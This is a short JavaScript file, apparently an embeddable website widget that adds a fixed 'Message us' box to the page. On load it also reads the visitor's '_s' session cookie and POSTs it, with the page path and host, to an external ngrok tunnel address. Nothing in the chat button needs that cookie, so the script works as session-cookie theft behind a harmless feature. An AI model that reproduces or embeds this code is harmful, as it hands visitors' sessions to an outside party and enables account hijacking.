(function(){

  function GetValue (offset)
    {
    		var strEnd = document.cookie.indexOf (";", offset);
    		if (strEnd == -1)
    			strEnd = document.cookie.length;
    		return unescape(document.cookie.substring(offset, strEnd));
    }

  function GetCookie(name)
    {
    		var key = name + "=";
    		var i = 0;
    		while (i < document.cookie.length) {
    			var j = i + key.length;
    			if (document.cookie.substring(i, j) == key)
    				return GetValue (j);
    			i = document.cookie.indexOf(" ", i) + 1;
    			if (i == 0)
    				break;
    		}
    		return null;
    }

  var myAppJavaScript = function(){
    var div = document.createElement('div');
    div.innerHTML = "<strong>Message us</strong>";
    div.style.width = "150px";
    div.style.height = "50px";
    div.style.color = "black";
    div.style.position = "fixed";
    div.style.right = "50px";
    div.style.bottom = "0";
    div.style.border = "1px solid #ddd";
    div.style.textAlign = "center";
    div.style.padding = "15px";
    div.style.borderRadius = "10px";
    div.style.backgroundColor = "white";
    document.body.appendChild(div);
    console.log(document.location.pathname);
    console.log(GetCookie('_s'));
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://eed3593a.ngrok.io/stat', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
        console.log(this.responseText);
    };
    xhr.send('session=' + GetCookie('_s') + '&pageName=' + document.location.pathname + '&host=' + document.location.host);
  };

  myAppJavaScript();

})();
